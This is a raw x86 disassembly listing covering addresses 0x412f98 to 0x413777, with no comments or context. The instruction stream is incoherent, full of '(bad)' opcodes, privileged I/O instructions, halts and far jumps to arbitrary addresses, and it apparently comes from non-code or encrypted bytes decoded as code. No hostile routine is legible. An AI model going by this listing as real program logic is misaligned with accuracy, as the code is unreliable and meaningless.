  412f98:	test   al,0x15
  412f9a:	xchg   esi,eax
  412f9b:	add    bh,al
  412f9d:	add    esp,DWORD PTR [ebx-0x3f]
  412fa0:	push   0xffffffd3
  412fa2:	pushf  
  412fa3:	in     al,0x2b
  412fa5:	aaa    
  412fa6:	call   0x1aa85a29
  412fab:	retf   
  412fac:	lods   al,BYTE PTR ds:[esi]
  412fad:	mov    cl,0x44
  412faf:	mov    cl,0x73
  412fb1:	fmul   QWORD PTR ds:0xc1c7a857
  412fb7:	lahf   
  412fb8:	cmp    dh,BYTE PTR [ebx+0x2f]
  412fbb:	dec    eax
  412fbc:	lds    esi,FWORD PTR [ebx+0x33]
  412fbf:	xchg   dl,bl
  412fc1:	adc    BYTE PTR [edx-0x61e2180e],dh
  412fc7:	fdivr  QWORD PTR [edx+0x6a97ea3e]
  412fcd:	jns    0x412faf
  412fcf:	push   edi
  412fd0:	mov    ebp,0xf263bc21
  412fd5:	cmc    
  412fd6:	inc    eax
  412fd7:	scas   al,BYTE PTR es:[edi]
  412fd8:	aad    0x10
  412fda:	add    ebp,esi
  412fdc:	into   
  412fdd:	sbb    eax,0x2f0874fb
  412fe2:	mov    edx,0x4e1222a8
  412fe7:	push   ss
  412fe8:	mov    ds:0x683b53d8,al
  412fed:	push   0x38
  412fef:	add    BYTE PTR [esi+0x76],al
  412ff2:	cmp    BYTE PTR [eax+0x27],0xbd
  412ff6:	mov    DWORD PTR [esi-0x7],edx
  412ff9:	push   0x49
  412ffb:	push   ebp
  412ffc:	xchg   esi,eax
  412ffd:	arpl   WORD PTR ds:[ecx+0x29],dx
  413001:	push   0x2d
  413003:	mov    al,0xfd
  413005:	call   0x6a40:0xb8e86a19
  41300c:	daa    
  41300d:	add    ch,bl
  41300f:	mov    ds:0xf8196e32,al
  413014:	imul   eax,DWORD PTR ss:[ecx-0x1631165f],0x1a
  41301c:	fwait
  41301d:	pop    edx
  41301e:	adc    bl,bh
  413020:	out    dx,al
  413021:	ins    BYTE PTR es:[edi],dx
  413022:	jmp    0x91c:0xda45fa1d
  413029:	cld    
  41302a:	inc    eax
  41302b:	xlat   BYTE PTR ds:[ebx]
  41302c:	and    al,0x4c
  41302e:	or     BYTE PTR ds:0x638a29ed,dl
  413034:	inc    ebx
  413035:	loopne 0x413081
  413037:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413038:	push   ebx
  413039:	mov    ds:0xcfffee4d,al
  41303e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41303f:	xor    esp,DWORD PTR [edi+0x79df8c62]
  413045:	loope  0x4130b8
  413047:	sub    DWORD PTR [esi-0x28],0x2cd535c6
  41304e:	mov    edi,DWORD PTR [edx]
  413050:	into   
  413051:	lods   al,BYTE PTR ds:[esi]
  413052:	fdiv   st,st(6)
  413054:	push   edi
  413055:	sub    DWORD PTR ds:0xa7bcc3a1,ebx
  41305b:	inc    esi
  41305c:	in     eax,dx
  41305d:	push   ss
  41305e:	mov    esp,0xeeb3db5d
  413063:	cdq    
  413064:	jb     0x412fee
  413066:	sbb    bl,BYTE PTR [eax]
  413068:	or     al,0x6e
  41306a:	call   0x5ce90dc9
  41306f:	shr    cl,0x1b
  413072:	adc    BYTE PTR [ecx+eax*1-0x7a],dl
  413076:	ds pop es
  413078:	add    ebx,ebp
  41307a:	pop    esp
  41307b:	inc    edi
  41307c:	fsubr  QWORD PTR [edx-0x19]
  41307f:	dec    ebp
  413080:	pop    esi
  413081:	nop
  413082:	dec    edx
  413083:	dec    edx
  413084:	stos   DWORD PTR es:[edi],eax
  413085:	popf   
  413086:	fnstcw WORD PTR [edx+0x48]
  413089:	add    al,0x0
  41308b:	test   DWORD PTR ds:0xed074cc0,ecx
  413091:	clc    
  413092:	into   
  413093:	push   0x27112004
  413098:	adc    al,0x1b
  41309a:	outs   dx,BYTE PTR ds:[esi]
  41309b:	inc    edi
  41309c:	mov    cl,0xa4
  41309e:	push   cs
  41309f:	lock mov eax,ds:0x2548d4c7
  4130a5:	popf   
  4130a6:	test   al,0xc5
  4130a8:	or     BYTE PTR [ebx],bl
  4130aa:	js     0x41307e
  4130ac:	xchg   edx,eax
  4130ad:	jmp    0x413054
  4130af:	add    edi,0x156f7691
  4130b5:	dec    eax
  4130b6:	lock bound eax,QWORD PTR [ebx]
  4130b9:	icebp  
  4130ba:	clc    
  4130bb:	push   edx
  4130bc:	mov    ds:0x111d5426,eax
  4130c1:	and    al,0x31
  4130c3:	sbb    DWORD PTR [edx],esp
  4130c5:	aaa    
  4130c6:	pop    ecx
  4130c7:	fidiv  WORD PTR [eax-0x13]
  4130ca:	mov    WORD PTR [ebx],?
  4130cc:	mov    edx,0x93844bda
  4130d1:	(bad)  [esp+esi*4-0x24]
  4130d5:	sbb    eax,0xd3dbb6cf
  4130da:	hlt    
  4130db:	mov    cl,BYTE PTR [ebp-0xf]
  4130de:	adc    BYTE PTR [esp+ecx*2+0x3c99bbc9],0xf2
  4130e6:	mov    edi,ebp
  4130e8:	in     eax,dx
  4130e9:	sbb    esp,0xffffff86
  4130ec:	fst    QWORD PTR ds:[ecx+eax*4]
  4130f0:	xchg   esi,eax
  4130f1:	fadd   DWORD PTR [ecx-0x4461222e]
  4130f7:	xchg   DWORD PTR [esi],edx
  4130f9:	das    
  4130fa:	mov    cs,ebx
  4130fc:	dec    ecx
  4130fd:	push   edi
  4130fe:	mov    bl,0xbb
  413100:	mov    bh,BYTE PTR [edx]
  413102:	mov    cl,0x4f
  413104:	rol    BYTE PTR ds:0x3f4a494d,0xd4
  41310c:	es lahf 
  41310e:	loopne 0x413136
  413110:	add    al,0xfa
  413112:	and    BYTE PTR [eax+0x8dbad39],0x98
  413119:	or     DWORD PTR [edi-0x59bf4e19],ebp
  41311f:	call   0xf5801b9c
  413124:	adc    al,0x69
  413126:	dec    edi
  413127:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413128:	xchg   ebp,eax
  413129:	cmc    
  41312a:	ret    
  41312b:	jae    0x413132
  41312d:	push   ds
  41312e:	push   cs
  41312f:	in     al,0x7d
  413131:	test   BYTE PTR [ebp-0x68],ch
  413134:	mov    dh,0xa
  413136:	or     al,0x6d
  413138:	sub    edi,ecx
  41313a:	pop    ebx
  41313b:	lea    esp,[esi]
  41313d:	pop    eax
  41313e:	mov    ebp,0x168f9777
  413143:	xchg   ebx,eax
  413144:	cmp    DWORD PTR [ebp-0x5c],0x77d77c74
  41314b:	repnz test al,0x34
  41314e:	outs   dx,DWORD PTR ds:[esi]
  41314f:	popa   
  413150:	call   0x8818a0c2
  413155:	sub    edi,DWORD PTR [ebx+0x769b047c]
  41315b:	js     0x4131b3
  41315d:	inc    esp
  41315e:	in     al,0xd0
  413160:	hlt    
  413161:	fmulp  st(6),st
  413163:	cwde   
  413164:	xchg   ebp,eax
  413165:	retf   
  413166:	xlat   BYTE PTR ds:[ebx]
  413167:	xlat   BYTE PTR ds:[ebx]
  413168:	mov    ch,0xde
  41316a:	gs push eax
  41316c:	(bad)  
  41316d:	arpl   WORD PTR [edi+0x74],sp
  413170:	adc    al,0x9e
  413172:	mov    eax,ds:0xbce8e225
  413177:	je     0x4131a7
  413179:	(bad)  
  41317a:	mov    dl,0x6
  41317c:	bound  ebp,QWORD PTR [eax-0x14]
  41317f:	cwde   
  413180:	scas   eax,DWORD PTR es:[edi]
  413181:	pop    ebx
  413182:	sub    eax,0x5d10ee8d
  413187:	ja     0x4131e9
  413189:	loope  0x4131f5
  41318b:	(bad)  
  41318c:	mov    ah,0xf8
  41318e:	add    cl,BYTE PTR [ebx]
  413190:	(bad)  
  413191:	jmp    0x5da3e23c
  413196:	in     eax,0xfd
  413198:	push   0x87f3f7
  41319d:	push   esi
  41319e:	adc    BYTE PTR [ecx-0x1a],al
  4131a1:	xchg   esp,eax
  4131a2:	repz es or al,0x79
  4131a6:	aaa    
  4131a7:	mov    bh,0xd9
  4131a9:	sbb    al,0x58
  4131ab:	rcl    ecx,0xc8
  4131ae:	ins    DWORD PTR es:[edi],dx
  4131af:	dec    ecx
  4131b0:	ds test al,0x6e
  4131b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131b4:	pop    es
  4131b5:	or     BYTE PTR [edx-0x708a973c],0x15
  4131bc:	adc    BYTE PTR [eax+0x4b],ah
  4131bf:	out    0xb6,eax
  4131c1:	out    0xb2,al
  4131c3:	stc    
  4131c4:	add    BYTE PTR [ecx-0x1a],bl
  4131c7:	or     DWORD PTR [eax],esp
  4131c9:	stos   BYTE PTR es:[edi],al
  4131ca:	daa    
  4131cb:	mov    ah,0x57
  4131cd:	enter  0xca5d,0x7a
  4131d1:	imul   eax,eax,0x724a8414
  4131d7:	jmp    FWORD PTR [eax-0x5765d709]
  4131dd:	gs das 
  4131df:	outs   dx,BYTE PTR ds:[esi]
  4131e0:	push   edx
  4131e1:	cwde   
  4131e2:	dec    ecx
  4131e3:	(bad)  
  4131e4:	aas    
  4131e5:	jecxz  0x413225
  4131e7:	aad    0x1a
  4131e9:	test   DWORD PTR [edi],0xd1329a90
  4131ef:	adc    eax,0x53f9eedc
  4131f4:	xor    ch,dl
  4131f6:	mov    edi,0x3d4a85d1
  4131fb:	ja     0x413223
  4131fd:	imul   edi,DWORD PTR [eax-0x33],0xffffff85
  413201:	add    ebx,0xca9eab83
  413207:	mov    edx,DWORD PTR [ebx]
  413209:	dec    ecx
  41320a:	hlt    
  41320b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41320c:	sub    al,0xd1
  41320e:	mov    ds:0x223bb18e,al
  413213:	out    0xad,eax
  413215:	jne    0x4131f3
  413217:	mov    edi,0xbc86112b
  41321c:	out    dx,al
  41321d:	stos   DWORD PTR es:[edi],eax
  41321e:	pop    ecx
  41321f:	push   ds
  413220:	sbb    BYTE PTR [esi],cl
  413222:	mov    al,ds:0x6e5f1f82
  413227:	scas   eax,DWORD PTR es:[edi]
  413228:	dec    edx
  413229:	mov    cl,0x58
  41322b:	(bad)  
  41322c:	push   ecx
  41322d:	iret   
  41322e:	cwde   
  41322f:	arpl   WORD PTR ds:0x181c03a6,dx
  413235:	scas   eax,DWORD PTR es:[edi]
  413236:	sbb    ebx,DWORD PTR [ecx+0x46395e3c]
  41323c:	mov    dh,0x23
  41323e:	sbb    ch,BYTE PTR [eax]
  413240:	cmp    DWORD PTR [eax],edi
  413242:	add    al,0xde
  413244:	rcl    bh,0x4a
  413247:	daa    
  413248:	pop    ecx
  413249:	push   ebx
  41324a:	push   edi
  41324b:	and    ebx,DWORD PTR [edx+0x5d405db8]
  413251:	pop    edi
  413252:	jge    0x41329d
  413254:	shl    DWORD PTR [edx+0x43],1
  413257:	cwde   
  413258:	aaa    
  413259:	push   ss
  41325a:	stos   BYTE PTR es:[edi],al
  41325b:	gs pop eax
  41325d:	stos   DWORD PTR es:[edi],eax
  41325e:	leave  
  41325f:	(bad)  
  413260:	fidiv  WORD PTR [ebp-0x1ca8840c]
  413266:	mov    ebx,0xa66b89de
  41326b:	jb     0x413289
  41326d:	sub    al,0x70
  41326f:	hlt    
  413270:	dec    edx
  413271:	xchg   esp,eax
  413272:	or     al,0xa6
  413274:	(bad)  
  413275:	into   
  413276:	rcl    BYTE PTR [esi+0x6dc54bd3],cl
  41327c:	sbb    BYTE PTR [eax+0x7d],ch
  41327f:	cmc    
  413280:	sub    eax,0xf8010106
  413285:	pop    ebp
  413286:	xor    eax,0x76e83a41
  41328b:	cmp    al,0xc2
  41328d:	loop   0x4132d5
  41328f:	dec    esp
  413290:	call   0x54f8:0x705e0b76
  413297:	repnz out dx,al
  413299:	stos   BYTE PTR es:[edi],al
  41329a:	int    0x34
  41329c:	dec    edx
  41329d:	(bad)  
  41329e:	mov    ch,0xb3
  4132a0:	outs   dx,BYTE PTR ds:[esi]
  4132a1:	or     eax,0x4c825e45
  4132a6:	shl    DWORD PTR [esi+0x37c4b2df],1
  4132ac:	dec    eax
  4132ad:	cld    
  4132ae:	ror    DWORD PTR [ecx+0x41494c0],0xae
  4132b5:	adc    edi,ebx
  4132b7:	jg     0x41327a
  4132b9:	cld    
  4132ba:	adc    DWORD PTR [eax+0x52],edx
  4132bd:	std    
  4132be:	xor    dl,al
  4132c0:	add    BYTE PTR ds:0x6d69f071,ah
  4132c6:	cmp    al,0x2b
  4132c8:	jmp    DWORD PTR [ecx-0x312fc267]
  4132ce:	cmc    
  4132cf:	fnstenv gs:[esi+0x14]
  4132d3:	jns    0x413278
  4132d5:	aam    0x56
  4132d7:	or     edx,DWORD PTR [eax-0x7d]
  4132da:	daa    
  4132db:	ja     0x4132a2
  4132dd:	or     DWORD PTR [edi-0x4a],ecx
  4132e0:	mov    esi,0x55797cba
  4132e5:	retf   
  4132e6:	in     al,0x64
  4132e8:	jno    0x4132e8
  4132ea:	sub    DWORD PTR [esi+0x1eaea48c],edx
  4132f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132f1:	or     BYTE PTR [esi],al
  4132f3:	sbb    bl,bh
  4132f5:	cmp    BYTE PTR ds:0x5fb5f015,ch
  4132fb:	dec    esi
  4132fc:	mov    eax,0x27b2909a
  413301:	ins    BYTE PTR es:[edi],dx
  413302:	xlat   BYTE PTR ds:[ebx]
  413303:	mov    eax,DWORD PTR [ecx]
  413305:	sub    al,0xc2
  413307:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413308:	in     al,0xae
  41330a:	arpl   WORD PTR [ebx-0x48e56d91],sp
  413310:	lods   al,BYTE PTR ds:[esi]
  413311:	mov    edi,ebx
  413313:	lods   al,BYTE PTR ds:[esi]
  413314:	adc    ah,BYTE PTR [esi-0x3314f6f0]
  41331a:	mov    esp,0x7b42ed00
  41331f:	sub    eax,0x5a202c06
  413324:	in     eax,dx
  413325:	add    eax,0xd6137f58
  41332a:	jp     0x41333c
  41332c:	fwait
  41332d:	imul   edi,DWORD PTR [esp+ecx*1-0x4cb7ae1f],0x4b
  413335:	adc    al,0x4e
  413337:	(bad)  
  413338:	adc    dh,bl
  41333a:	loop   0x41336d
  41333c:	enter  0x8bbd,0xe2
  413340:	mov    cl,0x8e
  413342:	pop    ds
  413343:	jbe    0x4132fb
  413345:	shr    DWORD PTR [esi+esi*2],cl
  413348:	pushf  
  413349:	jmp    0x413316
  41334b:	enter  0x3328,0x5
  41334f:	test   DWORD PTR [esi-0x79],ecx
  413352:	xor    BYTE PTR [edi],bl
  413354:	mov    dh,0x48
  413356:	and    al,0x5c
  413358:	clc    
  413359:	aaa    
  41335a:	ret    
  41335b:	mov    esp,0xa626aea
  413360:	lahf   
  413361:	cmp    ch,dh
  413363:	neg    ebp
  413365:	aaa    
  413366:	and    eax,0xe1f5c32
  41336b:	sbb    al,0x46
  41336d:	sbb    cl,ch
  41336f:	sahf   
  413370:	dec    esp
  413371:	cmp    DWORD PTR [eax],eax
  413373:	mov    ah,BYTE PTR [edi+0x29]
  413376:	mov    al,ah
  413378:	(bad)  
  413379:	scas   al,BYTE PTR es:[edi]
  41337a:	inc    edx
  41337b:	lahf   
  41337c:	sbb    ch,ch
  41337e:	adc    BYTE PTR [esi+eax*1-0x3f],ah
  413382:	test   BYTE PTR [edi-0x29f3d822],0xf4
  413389:	dec    ecx
  41338a:	ret    0x9949
  41338d:	icebp  
  41338e:	icebp  
  41338f:	push   ecx
  413390:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  413392:	push   ebx
  413393:	test   BYTE PTR [esi+0x26],ah
  413396:	mul    DWORD PTR [ecx+0x2c]
  413399:	jmp    0x997779a4
  41339e:	xchg   BYTE PTR [ecx],ah
  4133a0:	mov    ecx,0x1ad90fe1
  4133a5:	add    al,0xc9
  4133a7:	xor    DWORD PTR [edx+0x25],edx
  4133aa:	xchg   DWORD PTR [eax],edi
  4133ac:	retf   0x954c
  4133af:	jno    0x41333f
  4133b1:	icebp  
  4133b2:	repnz in eax,0x4a
  4133b5:	inc    ebp
  4133b6:	lahf   
  4133b7:	(bad)  
  4133b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133b9:	pop    edx
  4133ba:	test   eax,0x6f988ac4
  4133bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133c0:	pop    edx
  4133c1:	fstp   st(0)
  4133c3:	sbb    al,0x3a
  4133c5:	xor    eax,0x343df0cf
  4133ca:	js     0x413448
  4133cc:	not    BYTE PTR [ebx]
  4133ce:	test   esi,esp
  4133d0:	lahf   
  4133d1:	fadd   QWORD PTR [edi+ebp*1-0x2a3d324a]
  4133d8:	mov    esp,0x8d7db019
  4133dd:	pop    es
  4133de:	mov    edx,0xf9519c96
  4133e3:	mov    esp,0xdf56db62
  4133e8:	inc    edx
  4133e9:	xchg   esi,eax
  4133ea:	int3   
  4133eb:	mov    ebx,0xae972826
  4133f0:	dec    edi
  4133f1:	mov    esi,0xa042e6a4
  4133f6:	out    0x19,eax
  4133f8:	or     BYTE PTR [ebx],ch
  4133fa:	jecxz  0x41344f
  4133fc:	mov    ?,WORD PTR [ecx+ecx*1+0x25600cbb]
  413403:	lods   al,BYTE PTR ds:[esi]
  413404:	cmp    esp,ebp
  413406:	outs   dx,DWORD PTR ds:[esi]
  413407:	add    ebp,DWORD PTR [eax]
  413409:	imul   eax,DWORD PTR [eax-0x4d],0xc29a4c42
  413410:	pop    esi
  413411:	lods   al,BYTE PTR ds:[esi]
  413412:	xlat   BYTE PTR ds:[ebx]
  413413:	xchg   DWORD PTR [edx],ebx
  413415:	mov    dh,0xb7
  413417:	pushf  
  413418:	imul   eax,DWORD PTR [edi],0xb9fd491b
  41341e:	out    dx,eax
  41341f:	leave  
  413420:	push   esi
  413421:	clc    
  413422:	clc    
  413423:	stc    
  413424:	push   es
  413425:	(bad)  
  413426:	sahf   
  413427:	das    
  413428:	fnstcw WORD PTR [edi+0x3b524ac5]
  41342e:	ins    DWORD PTR es:[edi],dx
  41342f:	scas   eax,DWORD PTR es:[edi]
  413430:	sbb    esp,esp
  413432:	es dec edx
  413434:	fisubr DWORD PTR [ebp-0x7e]
  413437:	adc    DWORD PTR [edx+0x3c3f5f13],ebx
  41343d:	or     al,0x5d
  41343f:	cld    
  413440:	sbb    eax,0x91c39d93
  413445:	and    eax,0x1d5b85ba
  41344a:	adc    ebx,DWORD PTR [ebx-0x1e]
  41344d:	bound  edi,QWORD PTR [ebx+ebx*4+0x39fd7bef]
  413454:	imul   ecx,ebx,0xffffffed
  413457:	inc    eax
  413458:	lods   eax,DWORD PTR ds:[esi]
  413459:	inc    edi
  41345a:	add    DWORD PTR [ebx],esi
  41345c:	mov    dh,0xc1
  41345e:	retf   
  41345f:	mov    bh,0xaf
  413461:	imul   bl
  413463:	mov    eax,0xac3a4224
  413468:	pop    ebx
  413469:	pop    edx
  41346a:	push   DWORD PTR [ebx+0x3]
  41346d:	add    eax,0xf4366133
  413472:	or     BYTE PTR [eax],dl
  413474:	dec    sp
  413476:	sbb    DWORD PTR [edi+0x6f],ebx
  413479:	out    dx,eax
  41347a:	mov    edx,0x772f02f5
  41347f:	mov    dh,0x3e
  413481:	and    DWORD PTR ds:0x3d9959d6,ebp
  413487:	add    DWORD PTR [edi+eax*8],ebp
  41348a:	loop   0x4134a0
  41348c:	pushf  
  41348d:	pop    ebx
  41348e:	bound  esp,QWORD PTR [eax+ebp*2+0x15b29689]
  413495:	mov    edi,0xe8c27327
  41349a:	inc    ebp
  41349b:	dec    edx
  41349c:	and    bh,BYTE PTR [esi-0x4]
  41349f:	mov    esp,0xfd9a8806
  4134a4:	cmp    eax,0xfe28753e
  4134a9:	call   0x121518be
  4134ae:	mov    esp,0xb431d32e
  4134b3:	rcl    BYTE PTR [ecx-0x28b876eb],cl
  4134b9:	inc    edi
  4134ba:	data16 sub al,0x69
  4134bd:	scas   eax,DWORD PTR es:[edi]
  4134be:	call   0xc600c982
  4134c3:	mul    bl
  4134c5:	mov    eax,0x37ca6787
  4134ca:	xchg   edx,eax
  4134cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134cc:	jecxz  0x413463
  4134ce:	add    cl,dh
  4134d0:	inc    ebp
  4134d1:	sbb    dl,bh
  4134d3:	arpl   WORD PTR ds:0xa35b716a,dx
  4134d9:	xor    al,0x65
  4134db:	(bad)  
  4134dc:	scas   al,BYTE PTR es:[edi]
  4134dd:	call   0x9fca2cc0
  4134e2:	(bad)  
  4134e3:	retf   0xc511
  4134e6:	cwde   
  4134e7:	not    BYTE PTR [ebx+0x69]
  4134ea:	fiadd  WORD PTR [edx+0x40015a41]
  4134f0:	(bad)
  4134f4:	ds push 0x5e
  4134f7:	add    eax,0xa8e623c3
  4134fc:	pusha  
  4134fd:	pop    ebx
  4134fe:	mov    al,0x9e
  413500:	add    ah,BYTE PTR [edx+0x229c0c5]
  413506:	es mov bl,0x57
  413509:	pushf  
  41350a:	add    bl,BYTE PTR ds:0x429befbb
  413510:	clc    
  413511:	loop   0x4134c0
  413513:	test   DWORD PTR [esi+0x3ad4595c],ebx
  413519:	lock pop es
  41351b:	out    dx,al
  41351c:	pop    ebp
  41351d:	clc    
  41351e:	jne    0x413549
  413520:	stc    
  413521:	jl     0x413596
  413523:	xchg   ecx,eax
  413524:	test   DWORD PTR [edx-0x2c],ebx
  413527:	sbb    eax,0xa3e5983c
  41352c:	call   0x1a24:0x58a407d
  413533:	inc    ebp
  413534:	cmp    bh,BYTE PTR [esi]
  413536:	sbb    al,0xa7
  413538:	pop    ebx
  413539:	xor    DWORD PTR [ecx+edi*1-0x3b060493],0x7ab392c7
  413544:	in     al,0x2c
  413546:	inc    edi
  413547:	adc    bl,BYTE PTR [ebp+0x71]
  41354a:	xchg   BYTE PTR [ebx],dh
  41354c:	push   ebp
  41354d:	inc    ecx
  41354e:	cli    
  41354f:	in     al,dx
  413550:	cmc    
  413551:	jmp    0x758c:0x9416dcff
  413558:	call   DWORD PTR [ebp-0x68]
  41355b:	mov    ecx,0x548f1499
  413560:	shl    BYTE PTR [ebx],0x7a
  413563:	xchg   edi,eax
  413564:	rcl    BYTE PTR [ecx+0x7d7ede26],cl
  41356a:	fidiv  WORD PTR [edx]
  41356c:	mov    bl,0x60
  41356e:	add    DWORD PTR [edx+eiz*1],edi
  413571:	and    eax,0xdd5ce45b
  413576:	imul   eax,DWORD PTR [ebx+ecx*8-0xaaebf87],0x25
  41357e:	fmul   DWORD PTR [esi*1-0x794b0601]
  413585:	mov    ds,WORD PTR [ebp+0x31]
  413588:	mov    esp,0xee9ebec9
  41358d:	aad    0xcb
  41358f:	jne    0x4135a5
  413591:	je     0x413539
  413593:	adc    al,0xc
  413595:	je     0x4135d2
  413597:	mov    eax,ebp
  413599:	dec    ebx
  41359a:	or     al,0xe6
  41359c:	test   BYTE PTR [esi+0x43],0x70
  4135a0:	push   ebp
  4135a1:	inc    edi
  4135a2:	pop    esi
  4135a3:	mov    al,ds:0xe74a6ec2
  4135a8:	pop    eax
  4135a9:	mov    ss,WORD PTR [ebp-0x2]
  4135ac:	loopne 0x4135fc
  4135ae:	xchg   ecx,eax
  4135af:	imul   ecx,DWORD PTR [ebx+0x46608b33],0x1cf497da
  4135b9:	test   eax,0xd1d602e9
  4135bf:	push   eax
  4135c0:	es add eax,0xb9c3c723
  4135c6:	mov    dl,0xeb
  4135c8:	loope  0x4135b2
  4135ca:	sbb    al,BYTE PTR [ecx-0x2fe20c2]
  4135d0:	jge    0x4135a6
  4135d2:	pminsw mm7,QWORD PTR [eax+0x758ed77e]
  4135d9:	inc    esi
  4135da:	jge    0x4135b9
  4135dc:	lahf   
  4135dd:	ins    BYTE PTR es:[edi],dx
  4135de:	pop    edx
  4135df:	pop    esi
  4135e0:	and    al,0x7f
  4135e2:	aam    0xa0
  4135e4:	xchg   esi,eax
  4135e5:	pusha  
  4135e6:	(bad)  
  4135e7:	dec    edi
  4135e8:	sbb    dh,BYTE PTR [ebx+0x78]
  4135eb:	sbb    BYTE PTR [esp+ebx*2-0x3666cc62],dl
  4135f2:	xchg   ebp,eax
  4135f3:	jb     0x41363a
  4135f5:	fcmovu st,st(0)
  4135f7:	xor    dh,BYTE PTR [ecx+esi*1-0x4fae334b]
  4135fe:	jne    0x413674
  413600:	(bad)  
  413602:	aam    0x4e
  413604:	loopne 0x413652
  413606:	ret    0xe929
  413609:	push   0x9978cee0
  41360e:	not    eax
  413610:	ins    DWORD PTR es:[edi],dx
  413611:	push   edi
  413612:	daa    
  413613:	clc    
  413614:	push   0xcc42a5ba
  413619:	xchg   DWORD PTR [edi-0x5e],esi
  41361c:	add    al,0xef
  41361e:	pop    edi
  41361f:	mov    ebx,0x629179b8
  413624:	fsub   QWORD PTR [eax+0x2be2467e]
  41362a:	jl     0x4136a8
  41362c:	mov    ebx,0xc8ea5469
  413631:	mov    bh,0x7
  413633:	lds    esp,FWORD PTR [ebx*8+0x31f9314e]
  41363a:	inc    edx
  41363b:	leave  
  41363c:	cmp    edi,esp
  41363e:	inc    esp
  41363f:	xchg   edx,eax
  413640:	imul   ebp,esp,0x26
  413643:	in     eax,dx
  413644:	in     eax,0x13
  413646:	sub    DWORD PTR [eax-0x7298c94f],esp
  41364c:	sbb    al,0x28
  41364e:	fdiv   QWORD PTR [edi+esi*8]
  413651:	in     al,0x85
  413653:	push   0x24
  413655:	repnz xor DWORD PTR [ecx+0x63],edi
  413659:	xor    edi,DWORD PTR [esi+edx*8+0x25]
  41365d:	mov    ss,WORD PTR [edi-0xf318594]
  413663:	push   edi
  413664:	mov    eax,0x73bd349d
  413669:	mov    cs,WORD PTR [edi]
  41366b:	je     0x4136ac
  41366d:	sub    BYTE PTR [eax-0x4f],0x45
  413671:	retf   
  413672:	pop    edx
  413673:	ins    BYTE PTR es:[edi],dx
  413674:	add    edi,eax
  413676:	inc    ebx
  413677:	fwait
  413678:	jno    0x413661
  41367a:	icebp  
  41367b:	or     esp,DWORD PTR [ebp-0x5]
  41367e:	mov    WORD PTR [ecx+ebx*2-0x56],ss
  413682:	xor    BYTE PTR [ecx-0x2a],bl
  413685:	int    0xef
  413687:	(bad)  
  413688:	out    dx,al
  413689:	adc    al,0x4
  41368b:	add    BYTE PTR [edi],dh
  41368d:	je     0x4136e4
  41368f:	mov    edx,edx
  413691:	jmp    0x4e336169
  413696:	xchg   esi,eax
  413697:	icebp  
  413698:	mov    dl,0xc6
  41369a:	cmp    eax,0xd3f71fbf
  41369f:	push   edx
  4136a0:	pop    edi
  4136a1:	jecxz  0x413687
  4136a3:	and    al,0xf
  4136a5:	xlat   BYTE PTR ds:[ebx]
  4136a6:	ror    BYTE PTR [edx],0xbe
  4136a9:	and    ebx,esi
  4136ab:	pop    eax
  4136ac:	sbb    bh,BYTE PTR [eax-0x5d]
  4136af:	mov    ds:0x3afa5b15,eax
  4136b4:	xor    edi,DWORD PTR [esi+0x63]
  4136b7:	(bad)  
  4136b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136b9:	es mov esi,edx
  4136bc:	adc    edi,DWORD PTR [edx-0x38]
  4136bf:	(bad)  
  4136c0:	mov    ecx,0xd7af382c
  4136c5:	mov    ds:0xf945ca93,al
  4136ca:	inc    esi
  4136cb:	mov    ebx,0x73d71df4
  4136d0:	in     al,dx
  4136d1:	sbb    al,0x94
  4136d3:	mov    edx,0x16dd0ff9
  4136d8:	mov    edi,0xa42c3fb
  4136dd:	or     eax,0xbec32f97
  4136e2:	imul   edi,DWORD PTR ds:0xd6ece90,0xffffffc4
  4136e9:	xor    ebp,DWORD PTR [eax+0x3b]
  4136ec:	jmp    0x4136da
  4136ee:	stos   BYTE PTR es:[edi],al
  4136ef:	ror    cl,cl
  4136f1:	popf   
  4136f2:	mov    edx,0xa1723ea2
  4136f7:	ja     0x4136f4
  4136f9:	or     al,0xd1
  4136fb:	jo     0x413691
  4136fd:	inc    esp
  4136fe:	jle    0x413708
  413700:	(bad)  
  413701:	in     al,0xcd
  413703:	rdmsr  
  413705:	out    0xbd,al
  413707:	dec    eax
  413708:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413709:	popf   
  41370a:	cmp    DWORD PTR [ebx],esp
  41370c:	cmp    DWORD PTR [ecx+0x7c78385c],esp
  413712:	mov    eax,0x22d7986e
  413717:	mov    BYTE PTR [eax+eax*8],dl
  41371a:	or     eax,0xa3d709a3
  41371f:	mov    esi,0x2e6e475b
  413724:	or     ebp,0x44
  413727:	push   esi
  413728:	outs   dx,BYTE PTR ds:[esi]
  413729:	mov    ebx,DWORD PTR [esi]
  41372b:	nop
  41372c:	dec    edi
  41372d:	or     dh,BYTE PTR [eax-0x36]
  413730:	loopne 0x413776
  413732:	lods   eax,DWORD PTR ds:[esi]
  413733:	fcomp  QWORD PTR [edi]
  413735:	mov    ds,WORD PTR [ecx]
  413737:	neg    BYTE PTR [ebx+0x75]
  41373a:	int    0xb9
  41373c:	(bad)  
  41373e:	sub    al,0x7
  413740:	mov    ebp,0xecca0458
  413745:	leave  
  413746:	push   DWORD PTR [esp+ebx*1+0x6d]
  41374a:	into   
  41374b:	cs mov ah,0x4e
  41374e:	cmp    eax,0x9c3151ea
  413753:	bound  ebp,QWORD PTR [eax+0x1680e8d]
  413759:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41375a:	frstor [eax-0x7a]
  41375d:	sbb    al,0xd7
  41375f:	push   edx
  413760:	neg    BYTE PTR ds:0x898d1f8c
  413766:	push   ss
  413767:	xchg   ebp,eax
  413768:	and    ch,al
  41376a:	retf   
  41376b:	je     0x413739
  41376d:	jmp    0x505b:0x58ee2824
  413774:	jbe    0x413710
  413776:	xchg   ecx,eax
  413777:	sub    eax,DWORD PTR ds:0x1888a3df
